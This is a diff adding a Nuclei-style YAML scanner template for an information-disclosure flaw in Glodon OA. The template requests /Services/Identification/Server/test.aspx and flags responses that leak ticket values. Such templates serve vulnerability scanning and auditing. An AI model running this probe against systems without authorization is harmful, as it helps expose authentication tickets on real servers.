@@ -1,0 +1,30 @@
+id: glodon-Identification-Server-test-disclosure
+info:
+  name: 广联达OA-test.aspx接口信息泄露
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E5%B9%BF%E8%81%94%E8%BE%BEOA-test.aspx-leak.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: glodon,disclosure
+
+http:
+  - raw:
+      - |
+        GET /Services/Identification/Server/test.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'的ticket为')
+        condition: and
